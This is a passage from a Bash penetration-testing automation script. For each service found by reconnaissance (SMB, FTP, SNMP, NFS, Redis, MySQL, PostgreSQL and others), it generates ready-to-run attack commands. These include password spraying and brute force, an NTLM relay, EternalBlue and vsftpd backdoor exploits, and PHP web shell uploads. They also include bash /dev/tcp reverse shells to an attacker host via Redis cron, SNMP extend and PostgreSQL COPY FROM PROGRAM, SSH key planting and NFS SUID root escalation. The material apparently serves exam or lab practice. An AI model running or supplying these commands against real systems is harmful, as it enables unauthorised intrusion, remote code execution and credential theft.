                "cat $smtp_users_loot" \
                "./sprayr.sh -U $smtp_users_loot -p 'Password1' -t $ip" \
                "timeout 10m ./crackr.sh --hydra smb --target $ip -U $smtp_users_loot -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt" \
                "timeout 10m ./crackr.sh --hydra winrm --target $ip -U $smtp_users_loot -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt" \
                "timeout 10m ./crackr.sh --hydra smtp --target $ip -U $smtp_users_loot -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt" \
                "# If time permits and default-passwords came up empty: ./crackr.sh --hydra <svc> -U $smtp_users_loot -P /usr/share/wordlists/rockyou.txt" \
                "# CHEAT: vault/_CHEATSHEETS/Passwords.md §Remote Password Attacks"
        fi
    fi

    if is_phase_done "$target_dir" "smb" || detected_tcp_port "$target_dir" "445" || detected_tcp_port "$target_dir" "139"; then
        local smb_anon=false
        if grep -qiE 'READ|WRITE' "$target_dir/tcp/smb/smbmap_null.txt" 2>/dev/null || \
           grep -qiE 'READ|WRITE' "$target_dir/tcp/smb/smbmap_guest.txt" 2>/dev/null; then
            smb_anon=true
        fi
        if [[ "$smb_anon" == "true" ]]; then
            append_next_finding "$next_file" \
                "Readable SMB share found" \
                "$target_dir/tcp/smb/smbmap_null.txt or smbmap_guest.txt contains READ/WRITE" \
                "smbmap -H $ip -u '' -p ''" \
                "smbclient -L //$ip -N" \
                "smbclient //$ip/<SHARE> -N -c 'recurse; ls'" \
                "mkdir -p /mnt/smb_${ip//./_} && mount -t cifs //$ip/<SHARE> /mnt/smb_${ip//./_} -o guest" \
                "# CHEAT: vault/_CHEATSHEETS/Active_Directory.md §1.7 Share Enumeration & GPP Passwords"
        else
            append_next_finding "$next_file" \
                "SMB detected" \
                "nmap/progress indicates SMB on $ip" \
                "# Step 1 — null/guest session attempt (confirm smbmap_null/smbmap_guest output):" \
                "netexec smb $ip" \
                "smbmap -H $ip -u '' -p ''" \
                "smbmap -H $ip -u guest -p ''" \
                "" \
                "# DECIDE: null/guest returns READ/WRITE shares → the 'Readable SMB share' stanza fires, use that;" \
                "# DECIDE: null/guest returns only IPC\$ or NT_STATUS_ACCESS_DENIED → try the fallback enum chain below." \
                "" \
                "# Step 2 — fallback user-enum chain (null session returned nothing usable):" \
                "# 2a — rpcclient null-session user enumeration (works on older Windows + misconfigured Samba):" \
                "rpcclient -U '' -N $ip -c 'enumdomusers; enumdomgroups; querydominfo; netshareenum'" \
                "# 2b — LDAP anonymous bind (DC-like targets; check ${target_dir}/tcp/ldap/ for existing dump):" \
                "ldapsearch -x -H ldap://$ip -s base namingContexts" \
                "ldapsearch -x -H ldap://$ip -b <BASE_DN> '(objectClass=user)' sAMAccountName | grep -oP '(?<=sAMAccountName: ).*' | sort -u" \
                "# 2c — SMTP VRFY (if :25 open; existing SMTP stanza may have already produced vrfy_users.txt):" \
                "[[ -s $target_dir/tcp/smtp/vrfy_users.txt ]] && grep -oP '^VALID:\\s*\\K\\S+' $target_dir/tcp/smtp/vrfy_users.txt | sort -u" \
                "# 2d — SNMP Windows user list (if SNMP is open with a valid community; existing SNMP stanza may have produced windows_users.txt):" \
                "[[ -s $target_dir/udp/snmp/windows_users.txt ]] && grep -oP 'STRING:\\s*\"?\\K[^\"]+' $target_dir/udp/snmp/windows_users.txt | sort -u" \
                "snmpwalk -v2c -c public $ip 1.3.6.1.4.1.77.1.2.25   # only if community is valid" \
                "" \
                "# DECIDE: any of 2a–2d yields usernames → save to $target_dir/loot/smb_users.txt and spray:" \
                "#   ./sprayr.sh -U $target_dir/loot/smb_users.txt -p 'Password1' -t $ip" \
                "# DECIDE: still zero usernames → kerbrute against common names:" \
                "#   kerbrute userenum --dc $ip -d <DOMAIN> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt" \
                "" \
                "# Step 3 — with creds in hand (from spray, leak, or other stanza):" \
                "smbmap -H $ip -u <USER> -p '<PASS>'" \
                "smbclient -L //$ip -U '<DOMAIN>/<USER>%<PASS>'" \
                "./adr.sh -d <DOMAIN> -u <USER> -p '<PASS>' -dc $ip" \
                "# CHEAT: vault/_CHEATSHEETS/Active_Recon.md §SMB / RPC Deep Dive" \
                "# CHEAT: vault/_CHEATSHEETS/Active_Directory.md §1 Enumeration"
        fi
        append_next_finding "$next_file" \
            "SMB vulnerability checks" \
            "SMB open — run standard vuln scripts" \
            "nmap --script smb-vuln-ms17-010 -p 445 $ip" \
            "nmap --script smb-vuln-ms08-067 -p 445 $ip" \
            "nmap --script smb2-security-mode -p 445 $ip" \
            "netexec smb $ip -M zerologon" \
            "netexec smb $ip -M petitpotam" \
            "# CHEAT: vault/_CHEATSHEETS/Active_Directory.md §1.11 Security Controls Enumeration"

        if grep -qi 'SMB MS17-010 VULNERABLE' "$target_dir/loot/quick_wins.txt" 2>/dev/null; then
            append_next_finding "$next_file" \
                "MS17-010 EternalBlue confirmed" \
                "$target_dir/tcp/smb/nmap_smb_vuln.txt or quick_wins flagged MS17-010" \
                "cat $target_dir/tcp/smb/nmap_smb_vuln.txt" \
                "# OffSec-allowed exploit (manual, not auto):" \
                "# searchsploit ms17-010   # pick python PoC (e.g. 42315.py)" \
                "# python3 /usr/share/exploitdb/exploits/windows/remote/42315.py $ip" \
                "# CHEAT: vault/_CHEATSHEETS/Exploit_Research.md §5 Common engagement Exploit Patterns" \
                "# TODO: vault has no §MS17-010 — add the 42315.py workflow + auxiliary scanner note"
        fi

        if grep -qiE 'SMB SIGNING (DISABLED|NOT REQUIRED)' "$target_dir/loot/quick_wins.txt" 2>/dev/null; then
            append_next_finding "$next_file" \
                "SMB signing not required — relay candidate" \
                "$target_dir/tcp/smb/nmap_smb_vuln.txt shows signing not required" \
                "# Generate relay target list from all hosts:" \
                "netexec smb <subnet> --gen-relay-list /tmp/relay_targets.txt" \
                "# Start responder + ntlmrelayx on Kali:" \
                "sudo responder -I tun0 -wrf" \
                "impacket-ntlmrelayx -tf /tmp/relay_targets.txt -smb2support -socks" \
                "# CHEAT: vault/_CHEATSHEETS/Active_Directory.md §1.10 NTLM Relay Attack"
        fi
    fi

    local winrm_port
    winrm_port=$(first_detected_port "$target_dir" '(^5985/tcp|^5986/tcp|^47001/tcp|winrm|wsman)')
    if [[ -n "$winrm_port" ]]; then
        append_next_finding "$next_file" \
            "WinRM/WSMan detected" \
            "nmap service line includes port ${winrm_port}" \
            "netexec winrm $ip -u <USER> -p '<PASS>'" \
            "netexec winrm $ip -u <USER> -H '<NTLM_HASH>'" \
            "evil-winrm -i $ip -u <USER> -p '<PASS>'" \
            "evil-winrm -i $ip -u <USER> -H '<NTLM_HASH>'" \
            "# CHEAT: vault/_CHEATSHEETS/Active_Directory.md §3.5 WinRM"
    fi

    local httpdir
    for httpdir in "$target_dir/tcp/http"/port_*; do
        [[ -d "$httpdir" ]] || continue
        local p proto url evidence
        p=$(basename "$httpdir" | sed 's/port_//')
        proto=$(http_proto_for_port "$p")
        url="${proto}://${ip}:${p}"

        # Gate: only emit a deeper brute-force pass when the first-pass ferox
        # (enum_http at ~line 1246) did not produce output — otherwise it is
        # duplicate work over the same URL.
        if is_web_brute_target "$p" && is_phase_done "$target_dir" "http_${p}" && \
           [[ ! -s "$httpdir/feroxbuster.txt" ]]; then
            evidence="HTTP enum completed for port ${p} — whatweb/headers/robots/methods already captured at ${httpdir}/; first-pass ferox absent/empty"
            append_next_finding "$next_file" \
                "Web target ready for deeper enumeration" \
                "$evidence" \
                "feroxbuster -u $url -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -d 2 -t 50 --timeout 5 --time-limit 10m -o $httpdir/ferox_deep.txt" \
                "nuclei -u $url -severity critical,high,medium -stats -si 10 -timeout 5 -retries 1 -o $httpdir/nuclei.txt   # optional; requires nuclei installed" \
                "# CHEAT: vault/_CHEATSHEETS/Web_App.md §0 webenum — Operational Integration"
        fi

        if is_nonempty_file "$httpdir/http_methods.txt" && \
           grep -qiE 'Allow:.*(TRACE|PUT|DELETE|CONNECT|PROPFIND)|Public:.*(TRACE|PUT|DELETE|CONNECT|PROPFIND)' "$httpdir/http_methods.txt" 2>/dev/null; then
            append_next_finding "$next_file" \
                "Risky HTTP method found on port ${p}" \
                "$httpdir/http_methods.txt contains risky method in Allow/Public header" \
                "curl -skIX OPTIONS $url/" \
                "nmap --script http-methods -p $p $ip" \
                "curl -skI -X TRACE $url/ 2>/dev/null | sed -n '1,20p'" \
                "# CHEAT: vault/_CHEATSHEETS/Web_App.md §2 Find What to Attack"
        fi

        if is_nonempty_file "$httpdir/tls_names.txt"; then
            local tls_name
            tls_name=$(head -1 "$httpdir/tls_names.txt" 2>/dev/null)
            if [[ -n "$tls_name" ]]; then
                append_next_finding "$next_file" \
                    "TLS certificate hostname found" \
                    "$httpdir/tls_names.txt contains ${tls_name}" \
                    "cat $httpdir/tls_names.txt" \
                    "echo '$ip $tls_name' | sudo tee -a /etc/hosts" \
                    "./webenum.sh --url ${proto}://${tls_name}:${p}" \
                    "ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u $url -H 'Host: FUZZ.${tls_name#*.}' -mc 200,301,302,401,403" \
                    "# CHEAT: vault/_CHEATSHEETS/Web_App.md §0 webenum — Operational Integration"
            fi
        fi

        local vhost_json="$httpdir/ffuf_vhosts.json"
        if is_nonempty_file "$vhost_json"; then
            local vhosts
            vhosts=$(jq -r '.results[].host // .results[].input.VHOST // empty' "$vhost_json" 2>/dev/null | grep -v '^$' | sort -u | head -3)
            if [[ -n "$vhosts" ]]; then
                while IFS= read -r vhost; do
                    [[ -z "$vhost" ]] && continue
                    append_next_finding "$next_file" \
                        "Discovered vhost" \
                        "$vhost_json contains $vhost" \
                        "echo '$ip $vhost' | sudo tee -a /etc/hosts" \
                        "./webenum.sh --url ${proto}://${vhost}:${p}" \
                        "# CHEAT: vault/_CHEATSHEETS/Web_App.md §0 webenum — Operational Integration"
                done <<< "$vhosts"
            fi
        fi
    done

    if is_nonempty_file "$target_dir/tcp/ftp/ANONYMOUS_ACCESS.txt"; then
        append_next_finding "$next_file" \
            "Anonymous FTP access succeeded" \
            "$target_dir/tcp/ftp/ANONYMOUS_ACCESS.txt exists" \
            "ftp $ip" \
            "wget -r --no-passive-ftp --timeout=10 --tries=1 ftp://anonymous:anon@$ip/" \
            "find $target_dir/tcp/ftp/mirror -maxdepth 5 -type f 2>/dev/null | sort" \
            "# Grep mirror for secrets/keys/creds:" \
            "grep -RniE 'pass|secret|key|token|cred|user' $target_dir/tcp/ftp/mirror 2>/dev/null | head -40" \
            "find $target_dir/tcp/ftp/mirror -type f \\( -name 'id_rsa*' -o -name '*.kdbx' -o -name '*.ps1' -o -name '*.config' \\) 2>/dev/null" \
            "" \
            "# Step 2 — test if anonymous can write (classic anon-FTP → webshell pivot):" \
            "echo 'ftp-write-probe' > /tmp/ftp_probe.txt" \
            "curl -s --max-time 10 -T /tmp/ftp_probe.txt ftp://anonymous:anon@$ip/ftp_probe.txt && curl -s ftp://anonymous:anon@$ip/ftp_probe.txt" \
            "" \
            "# DECIDE: probe file is readable back → FTP root is writable, proceed to step 3;" \
            "# DECIDE: 550 Permission denied / upload fails → read-only anon, stop after mirror grep." \
            "" \
            "# Step 3 — test for FTP root ↔ web root overlap on each discovered HTTP port:" \
            "for wp_dir in \"$target_dir/tcp/http\"/port_*; do" \
            "    [[ -d \"\$wp_dir\" ]] || continue" \
            "    wp=\$(basename \"\$wp_dir\" | sed 's/port_//')" \
            "    proto=http; case \"\$wp\" in 443|8443|4443|9443) proto=https ;; esac" \
            "    code=\$(curl -sk --max-time 5 -o /dev/null -w '%{http_code}' \"\${proto}://$ip:\${wp}/ftp_probe.txt\")" \
            "    echo \"port \${wp}: \${code} (200 = overlap → upload webshell here)\"" \
            "done" \
            "" \
            "# DECIDE: no port returns 200 → no overlap, stop. Upload is useful only for staging payloads (NFS pickup, authorized_keys drop);" \
            "# DECIDE: a port returned 200 → it's the overlap, proceed to step 4 with that port as OVERLAP_PORT." \
            "" \
            "# Step 4 — fires ONLY if step 3 showed an overlap. Pick ONE webshell language based on that port's whatweb (do not run all three):" \
            "OVERLAP_PORT=<port that returned 200 in step 3>" \
            "cat $target_dir/tcp/http/port_\${OVERLAP_PORT}/whatweb.txt   # inspect first" \
            "" \
            "# DECIDE: whatweb shows PHP / Apache+mod_php / nginx+PHP-FPM → PHP shell, skip the JSP/ASPX DECIDEs below:" \
            "echo '<?php system(\$_GET[\"cmd\"]); ?>' > /tmp/shell.php && curl -s -T /tmp/shell.php ftp://anonymous:anon@$ip/shell.php" \
            "" \
            "# DECIDE: whatweb shows Apache-Coyote / Tomcat / Jetty → JSP shell instead:" \
            "# Craft shell.jsp (Runtime.exec one-liner — see vault/_CHEATSHEETS/Reverse_Shells.md §JSP), then:" \
            "# curl -s -T /tmp/shell.jsp ftp://anonymous:anon@$ip/shell.jsp" \
            "" \
            "# DECIDE: whatweb shows IIS / ASP.NET → ASPX shell instead (start penelope listener FIRST):" \
            "# On Kali: penelope -O -p 4444" \
            "# msfvenom -p windows/shell_reverse_tcp LHOST=\${KALI_IP} LPORT=4444 -f aspx > /tmp/shell.aspx" \
            "# curl -s -T /tmp/shell.aspx ftp://anonymous:anon@$ip/shell.aspx" \
            "" \
            "# Step 5 — trigger the uploaded shell via the overlap port:" \
            "# PHP: curl -sk \"http://$ip:\${OVERLAP_PORT}/shell.php?cmd=id\"" \
            "# JSP: curl -sk \"http://$ip:\${OVERLAP_PORT}/shell.jsp?cmd=id\"" \
            "# ASPX: curl -sk \"http://$ip:\${OVERLAP_PORT}/shell.aspx\"   # hits penelope listener" \
            "" \
            "# Cleanup the write probe when done: curl -s -Q 'DELE ftp_probe.txt' ftp://anonymous:anon@$ip/" \
            "# CHEAT: vault/_CHEATSHEETS/Active_Recon.md §FTP Anonymous Login Follow-Up" \
            "# CHEAT: vault/_CHEATSHEETS/Web_App.md §6 File Upload Vulnerabilities" \
            "# CHEAT: vault/_CHEATSHEETS/Reverse_Shells.md"
    fi

    if grep -qi 'FTP vsftpd 2\.3\.4 backdoor' "$target_dir/loot/quick_wins.txt" 2>/dev/null; then
        local ftp_vuln_port
        ftp_vuln_port=$(first_detected_port "$target_dir" 'ftp|^21/tcp')
        [[ -z "$ftp_vuln_port" ]] && ftp_vuln_port="21"
        append_next_finding "$next_file" \
            "vsftpd 2.3.4 backdoor confirmed" \
            "$target_dir/tcp/ftp/version_info.txt and quick_wins flagged vsftpd 2.3.4" \
            "cat $target_dir/tcp/ftp/version_info.txt" \
            "# OffSec-allowed manual exploit (smiley face backdoor on port 6200):" \
            "# 1) ftp $ip — login as 'user:)' (note the smiley)" \
            "# 2) On failure, port 6200 opens a root shell:" \
            "nc -nv $ip 6200" \
            "searchsploit vsftpd 2.3.4" \
            "# CHEAT: vault/_CHEATSHEETS/Exploit_Research.md §2 Service / Network Path" \
            "# TODO: vault has no §vsftpd-2.3.4 — add the smiley face backdoor workflow"
    fi

    if grep -qi 'FTP ProFTPD 1\.3\.5 mod_copy' "$target_dir/loot/quick_wins.txt" 2>/dev/null; then
        append_next_finding "$next_file" \
            "ProFTPD 1.3.5 mod_copy RCE candidate" \
            "$target_dir/tcp/ftp/version_info.txt flagged ProFTPD 1.3.5" \
            "cat $target_dir/tcp/ftp/version_info.txt" \
            "searchsploit proftpd 1.3.5" \
            "# Manual SITE CPFR/CPTO abuse via telnet:" \
            "# telnet $ip 21 → SITE CPFR /etc/passwd ; SITE CPTO /var/www/html/p.txt" \
            "# CHEAT: vault/_CHEATSHEETS/Exploit_Research.md §2 Service / Network Path" \
            "# TODO: vault has no §ProFTPD — add SITE CPFR/CPTO chain"
    fi

    if grep -qi 'FTP ProFTPD 1\.3\.3c backdoor' "$target_dir/loot/quick_wins.txt" 2>/dev/null; then
        append_next_finding "$next_file" \
            "ProFTPD 1.3.3c backdoor candidate" \
            "$target_dir/tcp/ftp/version_info.txt flagged ProFTPD 1.3.3c" \
            "searchsploit proftpd 1.3.3c" \
            "# Known backdoor distributed in 1.3.3c source tarball (OSVDB-69562)" \
            "# CHEAT: vault/_CHEATSHEETS/Exploit_Research.md §2 Service / Network Path"
    fi

    local pop3_port imap_port
    pop3_port=$(first_detected_port "$target_dir" 'pop3|^110/tcp|^995/tcp')
    if [[ -n "$pop3_port" ]] || grep -q "| DONE | pop3_" "$target_dir/progress.log" 2>/dev/null; then
        [[ -z "$pop3_port" ]] && pop3_port="110"
        append_next_finding "$next_file" \
            "POP3 detected" \
            "nmap/progress indicates POP3" \
            "nc -nv $ip $pop3_port" \
            "printf 'CAPA\\r\\nQUIT\\r\\n' | nc -nv $ip $pop3_port" \
            "timeout 10m hydra -L <users.txt> -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt -t 4 pop3://$ip" \
            "# If time permits and default-passwords came up empty: timeout 30m hydra -L <users.txt> -P /usr/share/wordlists/rockyou.txt -t 4 pop3://$ip" \
            "# CHEAT: vault/_CHEATSHEETS/Passwords.md §Remote Password Attacks"
    fi

    imap_port=$(first_detected_port "$target_dir" 'imap|^143/tcp|^993/tcp')
    if [[ -n "$imap_port" ]] || grep -q "| DONE | imap_" "$target_dir/progress.log" 2>/dev/null; then
        [[ -z "$imap_port" ]] && imap_port="143"
        append_next_finding "$next_file" \
            "IMAP detected" \
            "nmap/progress indicates IMAP" \
            "nc -nv $ip $imap_port" \
            "printf '. CAPABILITY\\r\\n. LOGOUT\\r\\n' | nc -nv $ip $imap_port" \
            "timeout 10m hydra -L <users.txt> -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt -t 4 imap://$ip" \
            "# If time permits and default-passwords came up empty: timeout 30m hydra -L <users.txt> -P /usr/share/wordlists/rockyou.txt -t 4 imap://$ip" \
            "# CHEAT: vault/_CHEATSHEETS/Passwords.md §Remote Password Attacks"
    fi

    if is_nonempty_file "$target_dir/udp/snmp/valid_community_strings.txt"; then
        local community
        community=$(head -1 "$target_dir/udp/snmp/valid_community_strings.txt")
        append_next_finding "$next_file" \
            "SNMP community string found" \
            "$target_dir/udp/snmp/valid_community_strings.txt is non-empty" \
            "cat $target_dir/udp/snmp/valid_community_strings.txt" \
            "timeout 10m snmpbulkwalk -v2c -c '${community}' -Cr50 -t 2 -r 1 $ip 2>&1 | tee $target_dir/udp/snmp/snmpwalk_full.txt" \
            "snmpwalk -v2c -c '${community}' -t 2 -r 1 $ip 1.3.6.1.2.1.25.4.2.1.5" \
            "" \
            "# Step 2 — test for writable community (read-only is the norm; writable is a score):" \
            "snmpset -v2c -c '${community}' $ip SNMPv2-MIB::sysContact.0 s 'pentest'" \
            "" \
            "# DECIDE: snmpset returns the new value → writable community confirmed, proceed to step 3;" \
            "# DECIDE: 'Reason: notWritable' or timeout → community is read-only, stop after step 1 walks." \
            "" \
            "# Step 3a — Linux target with net-snmp + extend enabled → arbitrary command execution:" \
            "snmpset -v2c -c '${community}' $ip 'NET-SNMP-EXTEND-MIB::nsExtendStatus.\"pe\"' i createAndGo 'NET-SNMP-EXTEND-MIB::nsExtendCommand.\"pe\"' s /usr/bin/id 'NET-SNMP-EXTEND-MIB::nsExtendArgs.\"pe\"' s ''" \
            "snmpwalk -v2c -c '${community}' $ip 'NET-SNMP-EXTEND-MIB::nsExtendOutLine.\"pe\"'" \
            "# Reverse shell variant — start listener first, then swap the Command/Args OIDs:" \
            "#   On Kali: penelope -O -p 4444" \
            "#   Swap Command OID to /bin/bash and Args OID to '-c \"bash -i >& /dev/tcp/\${KALI_IP}/4444 0>&1\"'" \
            "" \
            "# Step 3b — Cisco/network gear → config TFTP push (read startup-config to Kali tftp):" \
            "# Start Kali TFTP: sudo atftpd --daemon --port 69 /tmp" \
            "snmpset -v2c -c '${community}' $ip .1.3.6.1.4.1.9.9.96.1.1.1.1.2.111 i 1 .1.3.6.1.4.1.9.9.96.1.1.1.1.3.111 i 4 .1.3.6.1.4.1.9.9.96.1.1.1.1.4.111 i 1 .1.3.6.1.4.1.9.9.96.1.1.1.1.5.111 a \${KALI_IP} .1.3.6.1.4.1.9.9.96.1.1.1.1.6.111 s 'startup-config' .1.3.6.1.4.1.9.9.96.1.1.1.1.14.111 i 1" \
            "# Then grep /tmp/startup-config for 'enable secret' / 'username ... secret' lines" \
            "# CHEAT: vault/_CHEATSHEETS/Active_Recon.md §SNMP Follow-Up" \
            "# TODO: vault §SNMP Follow-Up covers walks only — add writable community primitives (nsExtend, Cisco TFTP push)"
    fi

    if grep -qP '^\s*/' "$target_dir/tcp/rpc/nfs_exports.txt" 2>/dev/null; then
        local export_path
        export_path=$(grep -P '^\s*/' "$target_dir/tcp/rpc/nfs_exports.txt" 2>/dev/null | head -1 | awk '{print $1}')
        append_next_finding "$next_file" \
            "NFS export found" \
            "$target_dir/tcp/rpc/nfs_exports.txt contains export path ${export_path}" \
            "showmount -e $ip" \
            "mkdir -p /mnt/nfs_${ip//./_}" \
            "mount -t nfs $ip:${export_path} /mnt/nfs_${ip//./_}" \
            "find /mnt/nfs_${ip//./_} -maxdepth 3 -type f -ls 2>/dev/null" \
            "cat /mnt/nfs_${ip//./_}/etc/exports 2>/dev/null  # check no_root_squash" \
            "# If no_root_squash: copy SUID bash to share from Kali (as root):" \
            "cp /bin/bash /mnt/nfs_${ip//./_}/tmp/bash && chmod +s /mnt/nfs_${ip//./_}/tmp/bash" \
            "# Then on target: /tmp/bash -p  → root shell" \
            "# CHEAT: vault/_CHEATSHEETS/Active_Recon.md §NFS / RPC Follow-Up" \
            "# TODO: vault has no §NFS-no_root_squash-SUID — document the /bin/bash + chmod +s escalation"
    fi

    if grep -qi 'REDIS NO-AUTH' "$target_dir/loot/quick_wins.txt" 2>/dev/null; then
        append_next_finding "$next_file" \
            "Redis no-auth access succeeded" \
            "$target_dir/loot/quick_wins.txt contains REDIS NO-AUTH" \
            "redis-cli -h $ip INFO" \
            "redis-cli -h $ip KEYS '*'" \
            "redis-cli -h $ip CONFIG GET '*'" \
            "# RCE via cron injection (Linux only):" \
            "redis-cli -h $ip CONFIG SET dir /var/spool/cron/crontabs/" \
            "redis-cli -h $ip CONFIG SET dbfilename root" \
            "redis-cli -h $ip SET payload \$'\\n\\n* * * * * bash -i >& /dev/tcp/${KALI_IP}/4444 0>&1\\n\\n'" \
            "redis-cli -h $ip BGSAVE" \
            "# RCE via SSH key injection (if /root/.ssh/ writable):" \
            "ssh-keygen -t rsa -f /tmp/redis_key -N '' && (echo -e '\\n'; cat /tmp/redis_key.pub; echo -e '\\n') > /tmp/redis_pubkey.txt" \
            "redis-cli -h $ip CONFIG SET dir /root/.ssh/ && redis-cli -h $ip CONFIG SET dbfilename authorized_keys" \
            "redis-cli -h $ip SET sshkey \"\$(cat /tmp/redis_pubkey.txt)\" && redis-cli -h $ip BGSAVE" \
            "ssh -i /tmp/redis_key root@$ip" \
            "# CHEAT: vault/_CHEATSHEETS/Exploit_Research.md §4 Exploit Type Reference" \
            "# TODO: vault has no §Redis — add cron/authorized_keys/MODULE LOAD RCE trio"
    fi

    if grep -qi 'LDAP anonymous bind' "$target_dir/loot/quick_wins.txt" 2>/dev/null && \
       is_nonempty_file "$target_dir/tcp/ldap/naming_contexts.txt"; then
        local base_dn
        base_dn=$(grep -oP 'namingContexts:\s*\K.*' "$target_dir/tcp/ldap/naming_contexts.txt" 2>/dev/null | head -1)
        append_next_finding "$next_file" \
            "LDAP anonymous bind returned data" \
            "$target_dir/tcp/ldap/naming_contexts.txt contains ${base_dn}" \
            "ldapsearch -x -H ldap://$ip -s base namingContexts" \
            "ldapsearch -x -H ldap://$ip -b '${base_dn}' '(objectClass=*)' | grep -iE 'sAMAccountName|mail|description|memberOf'" \
            "./adr.sh -d <DOMAIN> -u '' -p '' -dc $ip" \
            "# CHEAT: vault/_CHEATSHEETS/Active_Recon.md §LDAP Anonymous Bind Follow-Up"
    fi

    local mysql_port
    mysql_port=$(first_detected_port "$target_dir" 'mysql|^3306/tcp')
    if grep -qi 'MySQL ROOT NO-PASSWORD\|MySQL EMPTY PASSWORD' "$target_dir/loot/quick_wins.txt" 2>/dev/null || \
       (is_nonempty_file "$target_dir/tcp/mysql/root_nopass.txt" && ! grep -qi 'ERROR\|denied\|refused' "$target_dir/tcp/mysql/root_nopass.txt" 2>/dev/null); then
        [[ -z "$mysql_port" ]] && mysql_port="3306"
        append_next_finding "$next_file" \
            "MySQL no-password access succeeded" \
            "$target_dir/tcp/mysql/root_nopass.txt or quick_wins shows empty/root no-password access" \
            "mysql -h $ip -P $mysql_port -u root --password='' -e 'SHOW DATABASES;'" \
            "mysql -h $ip -P $mysql_port -u root --password='' -e 'SELECT user,host FROM mysql.user;'" \
            "mysql -h $ip -P $mysql_port -u root --password='' -e \"SHOW VARIABLES LIKE 'secure_file_priv';\"" \
            "# Webshell write (if secure_file_priv is empty or points to web root):" \
            "mysql -h $ip -P $mysql_port -u root --password='' -e \"SELECT '<?php system(\\\$_GET[\\\"cmd\\\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';\"" \
            "# Then trigger: curl http://$ip/shell.php?cmd=id" \
            "# Read local files:" \
            "mysql -h $ip -P $mysql_port -u root --password='' -e \"SELECT LOAD_FILE('/etc/passwd');\"" \
            "# CHEAT: vault/_CHEATSHEETS/Exploit_Research.md §4 Exploit Type Reference" \
            "# TODO: vault has no §MySQL-RCE — add INTO OUTFILE webshell + LOAD_FILE primitives"
    elif [[ -n "$mysql_port" ]]; then
        append_next_finding "$next_file" \
            "MySQL detected" \
            "nmap service line includes port ${mysql_port}" \
            "mysql -h $ip -P $mysql_port -u root --password=''" \
            "mysql -h $ip -P $mysql_port -u root" \
            "timeout 10m ./crackr.sh --hydra mysql --target $ip -u root -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt" \
            "# If time permits and default-passwords came up empty: ./crackr.sh --hydra mysql --target $ip -u root -P /usr/share/wordlists/rockyou.txt" \
            "# CHEAT: vault/_CHEATSHEETS/Passwords.md §Remote Password Attacks"
    fi

    local pg_port
    pg_port=$(first_detected_port "$target_dir" 'postgres|pgsql|^5432/tcp')
    if grep -qi 'PostgreSQL LOGIN' "$target_dir/loot/quick_wins.txt" 2>/dev/null; then
        [[ -z "$pg_port" ]] && pg_port="5432"
        local pg_creds pg_user pg_pass
        pg_creds=$(grep -oP 'PostgreSQL LOGIN:\s*\K\S+' "$target_dir/loot/quick_wins.txt" 2>/dev/null | head -1)
        pg_user="${pg_creds%%:*}"
        pg_pass="${pg_creds#*:}"
        [[ "$pg_pass" == "<empty>" || "$pg_pass" == "$pg_creds" ]] && pg_pass=""
        append_next_finding "$next_file" \
            "PostgreSQL login succeeded" \
            "$target_dir/loot/quick_wins.txt contains PostgreSQL LOGIN" \
            "PGPASSWORD='$pg_pass' psql -h $ip -p $pg_port -U '$pg_user' -c '\\l'" \
            "PGPASSWORD='$pg_pass' psql -h $ip -p $pg_port -U '$pg_user' -c 'SELECT usename,usesuper FROM pg_user;'" \
            "PGPASSWORD='$pg_pass' psql -h $ip -p $pg_port -U '$pg_user'" \
            "# Check for superuser (enables COPY TO PROGRAM RCE):" \
            "PGPASSWORD='$pg_pass' psql -h $ip -p $pg_port -U '$pg_user' -c 'SELECT current_setting($$is_superuser$$);'" \
            "" \
            "# DECIDE: is_superuser = on → proceed to COPY TO PROGRAM RCE (next block);" \
            "# DECIDE: is_superuser = off → try non-super file-read primitives first:" \
            "" \
            "# Non-super primitive A — pg_read_server_files (works if user has pg_read_server_files role, or CVE-2019-9193 on ≤11.2):" \
            "PGPASSWORD='$pg_pass' psql -h $ip -p $pg_port -U '$pg_user' -c \"SELECT pg_read_server_files('/etc/passwd');\"" \
            "PGPASSWORD='$pg_pass' psql -h $ip -p $pg_port -U '$pg_user' -c \"CREATE TABLE t(x text); COPY t FROM '/etc/passwd'; SELECT * FROM t;\"" \
            "" \
            "# Non-super primitive B — lo_import (large-object trick, worked on ≤9.4 as any user; later versions need role):" \
            "PGPASSWORD='$pg_pass' psql -h $ip -p $pg_port -U '$pg_user' -c \"SELECT lo_import('/etc/passwd', 1337); SELECT encode(lo_get(1337), 'escape');\"" \
            "" \
            "# DECIDE: primitive A or B returns file contents → target ~/.pgpass / postgresql.conf / pg_hba.conf for creds next;" \
            "# DECIDE: both fail with 'permission denied' → locked down, pivot to DB-data dump via SELECT on application tables." \
            "" \
            "# RCE via COPY TO PROGRAM (superuser only):" \
            "PGPASSWORD='$pg_pass' psql -h $ip -p $pg_port -U '$pg_user' -c \"DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text);\"" \
            "PGPASSWORD='$pg_pass' psql -h $ip -p $pg_port -U '$pg_user' -c \"COPY cmd_exec FROM PROGRAM 'id';\"" \
            "PGPASSWORD='$pg_pass' psql -h $ip -p $pg_port -U '$pg_user' -c 'SELECT * FROM cmd_exec;'" \
            "PGPASSWORD='$pg_pass' psql -h $ip -p $pg_port -U '$pg_user' -c \"COPY cmd_exec FROM PROGRAM 'bash -c \\\"bash -i >& /dev/tcp/${KALI_IP}/4444 0>&1\\\"';\"" \
            "# Webshell write via COPY TO (needs web root write access):" \
            "PGPASSWORD='$pg_pass' psql -h $ip -p $pg_port -U '$pg_user' -c \"COPY (SELECT '<?php system(\$_GET[\"cmd\"]); ?>') TO '/var/www/html/shell.php';\"" \
            "# CHEAT: vault/_CHEATSHEETS/Exploit_Research.md §4 Exploit Type Reference" \
            "# TODO: vault has no §PostgreSQL-RCE — add COPY TO PROGRAM + superuser check"
    elif [[ -n "$pg_port" ]]; then
        append_next_finding "$next_file" \
            "PostgreSQL detected" \
            "nmap service line includes port ${pg_port}" \
            "psql -h $ip -p $pg_port -U postgres" \
